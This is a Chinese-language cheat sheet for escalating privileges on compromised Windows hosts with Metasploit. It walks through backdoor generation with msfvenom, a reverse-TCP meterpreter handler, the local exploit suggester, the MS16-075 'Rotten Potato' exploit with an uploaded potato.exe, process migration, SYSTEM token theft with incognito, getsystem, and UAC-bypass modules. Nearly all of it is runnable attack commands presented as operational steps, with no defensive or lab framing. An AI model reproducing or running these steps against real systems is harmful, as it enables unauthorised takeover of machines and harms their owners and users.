MSF提权
## **上线**
生成后门程序
监听上线msfvenom
getuid查看当前用户权限。
background后台运行

# **web服务用户提权**
## **寻找提取方案**
use 提权方案  使用提权方案。如：use post/multi/recon/local_exploit_suggester
show options
sessions 列出上线的会话
set showdescription true 列出细节
set session 1  提权方案应用到上线的会话1
run   可以看到哪些提权cve的exploit可以使用
再run一次，更多详细。 

## **利用提权**
use exploit/windows/local/ms16_075_reflection_juicy  使用这个cve提权利用
show options
set session 1  提权cve利用应用到上线的会话1
run  提示全是[+]好[*]则成功，[-]号则失败。
sessions 1  回到会话
getuid查看权限提权成功
或新建一个会话返回

**如果show options的利用方式仅支持直接反弹：**
新监听个会话
```
use exploit/multi/handler
使用对应监听模块
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 6666
run
```
直接利用时反弹新端口：
use exploit/windows/local/ms16_075_reflection_juicy  使用这个cve提权利用
show options
设置监听机和端口666
exploit  直接利用上线到新监听机和端口。
此时回到监听的页面即可看到上线
getuid提权成功


# **本地用户提权**
## **Win的MSF会话中进程迁移提权**
进入会话
ps查看进程，哪些进程是system运行。
migrate 288进程号 ，即可
getuid 为system了

## **Win的MSF会话令牌窃取提权**
msf会话中
```
use incognito
list_tokens -u           #列出有的令牌,其中NT TAUTHORITY\SYSTEM为我们需要的
impersonate_token "NT AUTHORITY\SYSTEM" #窃取system令牌
getuid 即可是system
```

## **MSF配合烂土豆实现令牌窃取**
烂土豆(RottenPotato）MS16-075提权是一个本地提权，一般只针对本地用户，不支持域用户，这里更多是支持web服务用户。

原理：
烂土豆一个溢出漏洞功能是可以欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端，对这个认证过程使用中间人攻击（NTLM重放），为“NTAUTHORITYSYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的WindowsAPI调用实现的，模仿这个令牌。

条件：
只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。

适用版本：
Windows7/8/10，Windowsserver2008/2012


利用：
<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075>    
将烂土豆工具给上传至需要提权的机器中，potato.exe
msf会话中执行
```
execute -cH -f ./potato.exe    ##执行烂土豆程序
use incognito                  ##加载窃取功能
list_tokens -u                 ##查看可窃取的令牌
impersonate_token "NT AUTHORITY\SYSTEM"   ##使用令牌
getuid
``` 

## **Win的MSF会话自动提权**
msf会话中
```
getsystem //自动寻找msf中提权，仅支持windows
getuid
```
win10+有UAC保护时，可能不成功。

此时可以搜索bypassUAC模块使用。
>使用前提有两个：
>一是系统当前用户必须在管理员组中
>二是用户账户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机时通知我
```
search uac 查看对应系统版本的
use exploit/windows/local/ask    ##选择模块
sessions         ##查看后台会话
set session 1    ##选择应用的会话ID
set lport 5555   ##设置监听端口，有时候返回回来会出现错误，所以就另起一个监听。
```